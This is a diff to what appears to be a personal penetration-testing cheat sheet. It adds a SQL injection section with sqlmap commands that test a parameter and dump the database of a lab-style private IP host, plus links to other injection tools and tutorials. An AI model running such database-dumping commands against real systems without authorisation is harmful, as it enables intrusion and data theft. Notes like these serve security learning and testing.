@@ -147,6 +147,20 @@ Wfuzz -> https://www.hackingarticles.in/a-detailed-guide-on-wfuzz/
 🗲CloakQuest3r (https://github.com/spyboy-productions/CloakQuest3r)
   #python3 cloakquest3r.py example.com
 
-
 🗲BurpSuite
   #advencing-burp suite scope settings : ^.+google\.com$   port: ^443$  file: ^/.*
+
+
+# Sql Injection
+-> SqlMap
+    sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
+    sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
+    sqlmap.py -r /home/request.txt --dbs -> Login page username sqli detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-36e091e8a070)
+    sqlmap.py -r /home/request.txt --dbs --level 5 -> parameter sql detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-part-2-53e9775b67f5)
+
+-> Ghauri (https://github.com/r0oth3x49/ghauri)
+-> SqlFinder (https://github.com/americo/sqlifinder/tree/main)
+-> Blisqy (https://github.com/JohnTroony/Blisqy)
+
+
+
